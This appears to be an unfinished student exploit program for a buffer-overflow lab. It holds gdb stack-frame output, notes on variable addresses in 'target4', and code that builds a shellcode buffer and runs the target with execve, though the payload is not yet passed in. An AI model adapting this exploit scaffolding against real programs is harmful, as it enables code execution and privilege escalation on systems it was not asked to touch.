#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*
(gdb) info frame foo
Stack level 0, frame at 0x2021ff10:
 rip = 0x400bb5 in foo (target4.c:14); saved rip = 0x400c92
 called by frame at 0x2021ff30
 source language c.
 Arglist at 0x2021ff00, args: arg=0x7fffffffe2ec "test"
 Locals at 0x2021ff00, Previous frame's sp is 0x2021ff10
 Saved registers:
  rbp at 0x2021ff00, rip at 0x2021ff08

*/

//arg is at 0x2021fe48
//buffer is at 0x2021fe50
//len is at 0x2021fefc
//i is at 0x2021fef8


int main(void)
{
  char *args[3];
  char *env[1];
	int i;
	char tmp[200];
	for (i=0; i<200; i++){
		tmp[i] = '\x00';
	}

	strcpy(tmp, shellcode);
	

  	args[0] = TARGET; 
  	args[1] = "hi there"; 
	args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
